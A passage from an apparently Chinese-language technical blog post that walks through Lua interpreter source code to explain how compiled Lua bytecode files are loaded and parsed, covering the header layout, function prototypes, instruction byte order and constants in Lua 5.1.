<span class="comment">/* something failed */</span></span><br><span class="line">  <span class="keyword">if</span> (script &lt; argc &amp;&amp;  <span class="comment">/* execute main script (if there is one) */</span></span><br><span class="line">      handle_script(L, argv + script) != LUA_OK)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (args &amp; has_i)  <span class="comment">/* -i option? */</span></span><br><span class="line">    doREPL(L);  <span class="comment">/* do read-eval-print loop */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (script == argc &amp;&amp; !(args &amp; (has_e | has_v))) &#123;  <span class="comment">/* no arguments? */</span></span><br><span class="line">    <span class="keyword">if</span> (lua_stdin_is_tty()) &#123;  <span class="comment">/* running in interactive mode? */</span></span><br><span class="line">      print_version();</span><br><span class="line">      doREPL(L);  <span class="comment">/* do read-eval-print loop */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> dofile(L, <span class="literal">NULL</span>);  <span class="comment">/* executes stdin as a file */</span></span><br><span class="line">  &#125;</span><br><span class="line">  lua_pushboolean(L, <span class="number">1</span>);  <span class="comment">/* signal no errors */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>官方的注释已经非常详细了,可以知道当给出了目标文件会进入分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (script &lt; argc &amp;&amp;  <span class="comment">/* execute main script (if there is one) */</span></span><br><span class="line">    handle_script(L, argv + script) != LUA_OK)</span><br></pre></td></tr></table></figure><h3 id="handle-script"><a href="#handle-script" class="headerlink" title="handle_script"></a><strong>handle_script</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handle_script</span> <span class="params">(lua_State *L, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *fname = argv[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(fname, <span class="string">&quot;-&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">-1</span>], <span class="string">&quot;--&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">    fname = <span class="literal">NULL</span>;  <span class="comment">/* stdin */</span></span><br><span class="line">  status = luaL_loadfile(L, fname);</span><br><span class="line">  <span class="keyword">if</span> (status == LUA_OK) &#123;</span><br><span class="line">    <span class="type">int</span> n = pushargs(L);  <span class="comment">/* push arguments to script */</span></span><br><span class="line">    status = docall(L, n, LUA_MULTRET);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> report(L, status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的核心在于<code>luaL_loadfile(L, fname);</code></p><p><code>#define luaL_loadfile(L,f)  luaL_loadfilex(L,f,NULL)</code></p><p><code>luaL_loadfile</code>实际上就是<code>luaL_loadfilex</code></p><h3 id="luaL-loadfile"><a href="#luaL-loadfile" class="headerlink" title="luaL_loadfile"></a><strong>luaL_loadfile</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">LUALIB_API <span class="type">int</span> <span class="title function_">luaL_loadfilex</span> <span class="params">(lua_State *L, <span class="type">const</span> <span class="type">char</span> *filename,</span></span><br><span class="line"><span class="params">                                             <span class="type">const</span> <span class="type">char</span> *mode)</span> &#123;</span><br><span class="line">  LoadF lf;</span><br><span class="line">  <span class="type">int</span> status, readstatus;</span><br><span class="line">  <span class="type">int</span> c;</span><br><span class="line">  <span class="type">int</span> fnameindex = lua_gettop(L) + <span class="number">1</span>;  <span class="comment">/* index of filename on the stack */</span></span><br><span class="line">  <span class="keyword">if</span> (filename == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    lua_pushliteral(L, <span class="string">&quot;=stdin&quot;</span>);</span><br><span class="line">    lf.f = <span class="built_in">stdin</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    lua_pushfstring(L, <span class="string">&quot;@%s&quot;</span>, filename);</span><br><span class="line">    lf.f = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (lf.f == <span class="literal">NULL</span>) <span class="keyword">return</span> errfile(L, <span class="string">&quot;open&quot;</span>, fnameindex);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (skipcomment(&amp;lf, &amp;c))  <span class="comment">/* read initial portion */</span></span><br><span class="line">    lf.buff[lf.n++] = <span class="string">&#x27;\n&#x27;</span>;  <span class="comment">/* add line to correct line numbers */</span></span><br><span class="line">  <span class="keyword">if</span> (c == LUA_SIGNATURE[<span class="number">0</span>] &amp;&amp; filename) &#123;  <span class="comment">/* binary file? */</span></span><br><span class="line">    lf.f = freopen(filename, <span class="string">&quot;rb&quot;</span>, lf.f);  <span class="comment">/* reopen in binary mode */</span></span><br><span class="line">    <span class="keyword">if</span> (lf.f == <span class="literal">NULL</span>) <span class="keyword">return</span> errfile(L, <span class="string">&quot;reopen&quot;</span>, fnameindex);</span><br><span class="line">    skipcomment(&amp;lf, &amp;c);  <span class="comment">/* re-read initial portion */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (c != EOF)</span><br><span class="line">    lf.buff[lf.n++] = c;  <span class="comment">/* &#x27;c&#x27; is the first character of the stream */</span></span><br><span class="line">  status = lua_load(L, getF, &amp;lf, lua_tostring(L, <span class="number">-1</span>), mode);</span><br><span class="line">  readstatus = ferror(lf.f);</span><br><span class="line">  <span class="keyword">if</span> (filename) fclose(lf.f);  <span class="comment">/* close file (even in case of errors) */</span></span><br><span class="line">  <span class="keyword">if</span> (readstatus) &#123;</span><br><span class="line">    lua_settop(L, fnameindex);  <span class="comment">/* ignore results from &#x27;lua_load&#x27; */</span></span><br><span class="line">    <span class="keyword">return</span> errfile(L, <span class="string">&quot;read&quot;</span>, fnameindex);</span><br><span class="line">  &#125;</span><br><span class="line">  lua_remove(L, fnameindex);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这个函数开始就到了真正解析luac文件的部分</p><p><code>lf</code> 是一个 <code>LoadF</code> 结构，包含了文件相关的部分信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LoadF</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> n;  <span class="comment">/* number of pre-read characters */</span></span><br><span class="line">  FILE *f;  <span class="comment">/* file being read */</span></span><br><span class="line">  <span class="type">char</span> buff[BUFSIZ];  <span class="comment">/* area for reading file */</span></span><br><span class="line">&#125; LoadF;</span><br></pre></td></tr></table></figure><p>关注luac相关处理部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (c == LUA_SIGNATURE[<span class="number">0</span>] &amp;&amp; filename) &#123;  <span class="comment">/* binary file? */</span></span><br><span class="line">  lf.f = freopen(filename, <span class="string">&quot;rb&quot;</span>, lf.f);  <span class="comment">/* reopen in binary mode */</span></span><br><span class="line">  <span class="keyword">if</span> (lf.f == <span class="literal">NULL</span>) <span class="keyword">return</span> errfile(L, <span class="string">&quot;reopen&quot;</span>, fnameindex);</span><br><span class="line">  skipcomment(&amp;lf, &amp;c);  <span class="comment">/* re-read initial portion */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>#define LUA_SIGNATURE &quot;\033Lua&quot;</code></p><p>所以当文件的第一个字节是<code>1b</code>的时候会被认为是luac编译后的字节码文件,并重新以二进制模式（<code>&quot;rb&quot;</code>）打开文件,逐个读取字节直到<code>EOF</code>或者<code>1B</code>,</p><p>跳过可能存在的 Unix 执行标识行</p><h3 id="lua-load"><a href="#lua-load" class="headerlink" title="lua_load"></a>lua_load</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LUA_API <span class="type">int</span> <span class="title function_">lua_load</span> <span class="params">(lua_State *L, lua_Reader reader, <span class="type">void</span> *data,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">char</span> *chunkname, <span class="type">const</span> <span class="type">char</span> *mode)</span> &#123;</span><br><span class="line">  ZIO z;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  lua_lock(L);</span><br><span class="line">  <span class="keyword">if</span> (!chunkname) chunkname = <span class="string">&quot;?&quot;</span>;</span><br><span class="line">  luaZ_init(L, &amp;z, reader, data);</span><br><span class="line">  status = luaD_protectedparser(L, &amp;z, chunkname, mode);</span><br><span class="line">  <span class="keyword">if</span> (status == LUA_OK) &#123;  <span class="comment">/* no errors? */</span></span><br><span class="line">    LClosure *f = clLvalue(L-&gt;top - <span class="number">1</span>);  <span class="comment">/* get newly created function */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;nupvalues &gt;= <span class="number">1</span>) &#123;  <span class="comment">/* does it have an upvalue? */</span></span><br><span class="line">      <span class="comment">/* get global table from registry */</span></span><br><span class="line">      Table *reg = hvalue(&amp;G(L)-&gt;l_registry);</span><br><span class="line">      <span class="type">const</span> TValue *gt = luaH_getint(reg, LUA_RIDX_GLOBALS);</span><br><span class="line">      <span class="comment">/* set global table as 1st upvalue of &#x27;f&#x27; (may be LUA_ENV) */</span></span><br><span class="line">      setobj(L, f-&gt;upvals[<span class="number">0</span>]-&gt;v, gt);</span><br><span class="line">      luaC_upvalbarrier(L, f-&gt;upvals[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  lua_unlock(L);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接进入我们关注的部分<code>luaD_protectedparser</code></p><h3 id="luaD-protectedparser"><a href="#luaD-protectedparser" class="headerlink" title="luaD_protectedparser"></a>luaD_protectedparser</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">luaD_protectedparser</span> <span class="params">(lua_State *L, ZIO *z, <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">                                        <span class="type">const</span> <span class="type">char</span> *mode)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">SParser</span> <span class="title">p</span>;</span></span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  L-&gt;nny++;  <span class="comment">/* cannot yield during parsing */</span></span><br><span class="line">  p.z = z; p.name = name; p.mode = mode;</span><br><span class="line">  p.dyd.actvar.arr = <span class="literal">NULL</span>; p.dyd.actvar.size = <span class="number">0</span>;</span><br><span class="line">  p.dyd.gt.arr = <span class="literal">NULL</span>; p.dyd.gt.size = <span class="number">0</span>;</span><br><span class="line">  p.dyd.label.arr = <span class="literal">NULL</span>; p.dyd.label.size = <span class="number">0</span>;</span><br><span class="line">  luaZ_initbuffer(L, &amp;p.buff);</span><br><span class="line">  status = luaD_pcall(L, f_parser, &amp;p, savestack(L, L-&gt;top), L-&gt;errfunc);</span><br><span class="line">  luaZ_freebuffer(L, &amp;p.buff);</span><br><span class="line">  luaM_freearray(L, p.dyd.actvar.arr, p.dyd.actvar.size);</span><br><span class="line">  luaM_freearray(L, p.dyd.gt.arr, p.dyd.gt.size);</span><br><span class="line">  luaM_freearray(L, p.dyd.label.arr, p.dyd.label.size);</span><br><span class="line">  L-&gt;nny--;</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上两个函数其实都没有针对字节码文件的专门处理,无需过多关注</p><h3 id="f-parser"><a href="#f-parser" class="headerlink" title="f_parser"></a>f_parser</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">f_parser</span> <span class="params">(lua_State *L, <span class="type">void</span> *ud)</span> &#123;</span><br><span class="line">  LClosure *cl;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">SParser</span> *<span class="title">p</span> =</span> cast(<span class="keyword">struct</span> SParser *, ud);</span><br><span class="line">  <span class="type">int</span> c = zgetc(p-&gt;z);  <span class="comment">/* read first character */</span></span><br><span class="line">  <span class="keyword">if</span> (c == LUA_SIGNATURE[<span class="number">0</span>]) &#123;</span><br><span class="line">    checkmode(L, p-&gt;mode, <span class="string">&quot;binary&quot;</span>);</span><br><span class="line">    cl = luaU_undump(L, p-&gt;z, p-&gt;name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    checkmode(L, p-&gt;mode, <span class="string">&quot;text&quot;</span>);</span><br><span class="line">    cl = luaY_parser(L, p-&gt;z, &amp;p-&gt;buff, &amp;p-&gt;dyd, p-&gt;name, c);</span><br><span class="line">  &#125;</span><br><span class="line">  lua_assert(cl-&gt;nupvalues == cl-&gt;p-&gt;sizeupvalues);</span><br><span class="line">  luaF_initupvals(L, cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次判断第一个字节是否为<code>1B</code>,是则处理函数设置为<code>luaU_undump</code></p><h3 id="luaU-undump"><a href="#luaU-undump" class="headerlink" title="luaU_undump"></a>luaU_undump</h3><p>终于正式开始加载字节码文件</p><p>在此之前5.1和5.3差异不大,不过在这个函数就开始出现较大差异了</p><h4 id="5-1"><a href="#5-1" class="headerlink" title="5.1"></a>5.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Proto* <span class="title function_">luaU_undump</span> <span class="params">(lua_State* L, ZIO* Z, Mbuffer* buff, <span class="type">const</span> <span class="type">char</span>* name)</span></span><br><span class="line">&#123;</span><br><span class="line"> LoadState S;</span><br><span class="line"> <span class="keyword">if</span> (*name==<span class="string">&#x27;@&#x27;</span> || *name==<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">  S.name=name+<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (*name==LUA_SIGNATURE[<span class="number">0</span>])</span><br><span class="line">  S.name=<span class="string">&quot;binary string&quot;</span>;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">  S.name=name;</span><br><span class="line"> S.L=L;</span><br><span class="line"> S.Z=Z;</span><br><span class="line"> S.b=buff;</span><br><span class="line"> LoadHeader(&amp;S);</span><br><span class="line"> <span class="keyword">return</span> LoadFunction(&amp;S,luaS_newliteral(L,<span class="string">&quot;=?&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="LoadHeader"><a href="#LoadHeader" class="headerlink" title="LoadHeader"></a>LoadHeader</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadHeader</span><span class="params">(LoadState* S)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">char</span> h[LUAC_HEADERSIZE];</span><br><span class="line"> <span class="type">char</span> s[LUAC_HEADERSIZE];</span><br><span class="line"> luaU_header(h);</span><br><span class="line"> LoadBlock(S,s,LUAC_HEADERSIZE);</span><br><span class="line"> IF (<span class="built_in">memcmp</span>(h,s,LUAC_HEADERSIZE)!=<span class="number">0</span>, <span class="string">&quot;bad header&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>luaU_header获取标准header</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">luaU_header</span> <span class="params">(<span class="type">char</span>* h)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> x=<span class="number">1</span>;</span><br><span class="line"> <span class="built_in">memcpy</span>(h,LUA_SIGNATURE,<span class="keyword">sizeof</span>(LUA_SIGNATURE)<span class="number">-1</span>);</span><br><span class="line"> h+=<span class="keyword">sizeof</span>(LUA_SIGNATURE)<span class="number">-1</span>;</span><br><span class="line"> *h++=(<span class="type">char</span>)LUAC_VERSION;</span><br><span class="line"> *h++=(<span class="type">char</span>)LUAC_FORMAT;</span><br><span class="line"> *h++=(<span class="type">char</span>)*(<span class="type">char</span>*)&amp;x;<span class="comment">/* endianness */</span></span><br><span class="line"> *h++=(<span class="type">char</span>)<span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line"> *h++=(<span class="type">char</span>)<span class="keyword">sizeof</span>(<span class="type">size_t</span>);</span><br><span class="line"> *h++=(<span class="type">char</span>)<span class="keyword">sizeof</span>(Instruction);</span><br><span class="line"> *h++=(<span class="type">char</span>)<span class="keyword">sizeof</span>(lua_Number);</span><br><span class="line"> *h++=(<span class="type">char</span>)(((lua_Number)<span class="number">0.5</span>)==<span class="number">0</span>);<span class="comment">/* is lua_Number integral? */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LoadBlock则获取目标文件header</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadBlock</span><span class="params">(LoadState* S, <span class="type">void</span>* b, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">size_t</span> r=luaZ_read(S-&gt;Z,b,size);</span><br><span class="line"> IF (r!=<span class="number">0</span>, <span class="string">&quot;unexpected end&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里我们可以分析出字节码文件的header结构应该如下()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> signature[<span class="number">4</span>];   <span class="comment">// #define LUA_SIGNATURE   &quot;\033Lua&quot;</span></span><br><span class="line">    uchar version;</span><br><span class="line">    uchar format;</span><br><span class="line">    uchar endian;</span><br><span class="line">    uchar size_int;</span><br><span class="line">    uchar <span class="type">size_size_t</span>;</span><br><span class="line">    uchar size_Instruction;</span><br><span class="line">    uchar size_lua_Number;</span><br><span class="line">    uchar lua_num_valid;</span><br><span class="line">&#125; GlobalHeader;</span><br></pre></td></tr></table></figure><h5 id="LoadFunction"><a href="#LoadFunction" class="headerlink" title="LoadFunction"></a>LoadFunction</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> Proto* <span class="title function_">LoadFunction</span><span class="params">(LoadState* S, TString* p)</span></span><br><span class="line">&#123;</span><br><span class="line"> Proto* f;</span><br><span class="line"> <span class="keyword">if</span> (++S-&gt;L-&gt;nCcalls &gt; LUAI_MAXCCALLS) error(S,<span class="string">&quot;code too deep&quot;</span>);</span><br><span class="line"> f=luaF_newproto(S-&gt;L);</span><br><span class="line"> setptvalue2s(S-&gt;L,S-&gt;L-&gt;top,f); incr_top(S-&gt;L);</span><br><span class="line"> f-&gt;source=LoadString(S); </span><br><span class="line"> <span class="keyword">if</span> (f-&gt;source==<span class="literal">NULL</span>) f-&gt;source=p;</span><br><span class="line"> f-&gt;linedefined=LoadInt(S);</span><br><span class="line"> f-&gt;lastlinedefined=LoadInt(S);</span><br><span class="line"> f-&gt;nups=LoadByte(S);</span><br><span class="line"> f-&gt;numparams=LoadByte(S);</span><br><span class="line"> f-&gt;is_vararg=LoadByte(S);</span><br><span class="line"> f-&gt;maxstacksize=LoadByte(S);</span><br><span class="line"> LoadCode(S,f);</span><br><span class="line"> LoadConstants(S,f);</span><br><span class="line"> LoadDebug(S,f);</span><br><span class="line"> IF (!luaG_checkcode(f), <span class="string">&quot;bad code&quot;</span>);</span><br><span class="line"> S-&gt;L-&gt;top--;</span><br><span class="line"> S-&gt;L-&gt;nCcalls--;</span><br><span class="line"> <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个函数原型proto之后,加载proto的一些信息</p><ul><li><p><code>f-&gt;source</code>：尝试从字节码文件中加载函数的源代码位置信息，通常是文件名或函数名。</p></li><li><p><code>f-&gt;linedefined</code>：函数在源文件中定义的起始行号，通过 <code>LoadInt(S)</code> 读取。</p></li><li><p><code>f-&gt;lastlinedefined</code>：函数在源文件中的结束行号，表示函数的定义区间。</p></li><li><p><code>f-&gt;nups</code>：表示函数所需的 upvalues（闭包捕获的外部变量）的数量。</p></li><li><code>f-&gt;numparams</code>：表示函数的固定参数数量。</li><li><code>f-&gt;is_vararg</code>：表示函数是否是可变参数函数。该值是一个布尔标记，若为 1 则表示函数是可变参数的。</li><li><code>f-&gt;maxstacksize</code>：函数执行时需要的最大栈大小，表示该函数最多会占用多少 Lua 虚拟机的栈空间。</li></ul><h6 id="LoadCode"><a href="#LoadCode" class="headerlink" title="LoadCode"></a>LoadCode</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadCode</span><span class="params">(LoadState* S, Proto* f)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> n=LoadInt(S);</span><br><span class="line"> f-&gt;code=luaM_newvector(S-&gt;L,n,Instruction);</span><br><span class="line"> f-&gt;sizecode=n;</span><br><span class="line"> LoadVector(S,f-&gt;code,n,<span class="keyword">sizeof</span>(Instruction));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用 <code>LoadCode(S, f)</code>从字节码文件中读取函数的实际指令(字节码)</p><p>使用 <code>f-&gt;code</code> 存储这些指令,<code>f-&gt;sizecode</code>存储指令数量</p><p>Lua一个指令占4个字节,下图是格式,但其实这个图理解起来可能会出现一些误解,因为通常人类认为的小端序,常常是默认左侧为低右侧为高(四个字节0123),但在字节内部确是左侧为高右侧为低(8bits—&gt;76543210)</p><p>虽然对于计算机来说不会出任何问题,但人在理解时有时就会出现差异,例如按照小端序取最低6位,本应该是0-5,但按照之前的理解实际上会取到2-7,并且高低位还会搞反,其实还是人自己理解的角度,写这么一大串就是因为我自己开始理解错了</p><p>但如果将Lua字节码字节串按字节反转,那么就刚好4字节32位完全按照从高到低排列,也就是下图</p><p>此外<code>mi_lua</code>在parse指令时就是先将其按字节反转,再套入顺序颠倒的Bitstruct,这样就得到了正确的操作码和操作数</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/213123123.jpeg" alt=""></p><h6 id="LoadConstants"><a href="#LoadConstants" class="headerlink" title="LoadConstants"></a>LoadConstants</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadConstants</span><span class="params">(LoadState* S, Proto* f)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> i,n;</span><br><span class="line"> n=LoadInt(S);</span><br><span class="line"> f-&gt;k=luaM_newvector(S-&gt;L,n,TValue);</span><br><span class="line"> f-&gt;sizek=n;</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) setnilvalue(&amp;f-&gt;k[i]);</span><br><span class="line"> <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line"> &#123;</span><br><span class="line">  TValue* o=&amp;f-&gt;k[i];</span><br><span class="line">  <span class="type">int</span> t=LoadChar(S);</span><br><span class="line">  <span class="keyword">switch</span> (t)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">case</span> LUA_TNIL:</span><br><span class="line">   setnilvalue(o);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> LUA_TBOOLEAN:</span><br><span class="line">   setbvalue(o,LoadChar(S)!=<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> LUA_TNUMBER:</span><br><span class="line">setnvalue(o,LoadNumber(S));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> LUA_TSTRING:</span><br><span class="line">setsvalue2n(S-&gt;L,o,LoadString(S));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">error(S,<span class="string">&quot;bad constant&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> n=LoadInt(S);</span><br><span 